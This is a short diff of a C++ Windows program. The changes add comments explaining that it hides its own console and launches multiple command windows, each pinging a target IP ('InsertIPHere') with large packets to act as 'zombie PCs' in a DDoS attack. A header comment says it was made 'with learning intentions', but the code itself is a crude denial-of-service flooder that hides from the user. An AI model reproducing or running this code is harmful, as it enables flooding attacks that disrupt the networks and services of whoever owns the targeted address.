@@ -1,14 +1,17 @@
+//This code was created with learning intentions
+//This code will open multiple CMD's pretending to be "zombie PCs" each will ping an IP doing a DDOS attack
+
 #include<iostream>
 #include<string.h>
 #include<windows.h>
 
 using namespace std;
 
-string texto();
-void hideW();
+string texto();								//Texto "text" Function will create the script inserted in CMD
+void hideW();								//Hide window Function, will hide the Console of the Compiler 
 
 int main(void){
-	hideW();
+	hideW();								
 	
 	string txt = texto();
 	const char *command = txt.c_str();
@@ -19,8 +22,8 @@ int main(void){
 
 
 string texto(){
-	string IP = "InsertIPHere -n 30 -l 62500";
-	string nuevo = "start";
+	string IP = "InsertIPHere -n 30 -l 62500";		//
+	string nuevo = "start";							//Will start a new CMD
 	string ejec = "&";
 	string esp = " ";
 	string comando, comandoY;
